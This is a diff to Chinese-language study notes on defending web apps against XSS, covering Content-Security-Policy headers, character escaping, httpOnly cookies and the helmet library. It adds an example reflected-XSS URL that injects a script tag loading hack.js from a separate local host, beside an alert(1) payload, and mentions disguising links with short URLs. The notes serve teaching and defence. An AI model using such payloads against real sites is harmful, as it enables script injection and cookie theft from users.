@@ -14,6 +14,7 @@
 
 ```
 localhost:3000/?from=<script>alert(1)</script>
+localhost:3000/?from=<script src="localhost:4000/hack.js"></script>
 
 ```
 2. 通过将url进行短域名伪造，https://dwz.cn
@@ -35,7 +36,6 @@ localhost:3000/?from=<script>alert(1)</script>
     1. `Content-Security-Policy: default-src 'self'` 只能加载本站资源
     2. `Content-Security-Policy: img-src https://*` 只能加载https的图片
     3. `Content-Security-Policy: child-src 'none'` 不允许加载任何来源的框架
-    2. 
 ## 转义
  1. 前后端对任何可输入的地方做字符转义，例如<、>；
  2. 但是如果是富文本的话，需要针对有危险的字符做转换，例如`<script>`; koa中用到的库 ，例如`xss`，就针对性转义
@@ -43,6 +43,9 @@ localhost:3000/?from=<script>alert(1)</script>
 ## httpOnly
  1. 这个是预防XSS攻击窃取用户cookie最有效的方法，web应用在设置cookie的时候，将其属性设置为HttpOnly,这样cookie就不会被js读取
  2. `set-cookie: uid=112; Path=/;HttpOnly` 
+
+> 这些安全的防御措施有部分就是设置报头
+**nodejs这块有helmet这个库来处理一些安全上的问题**
 
 
 
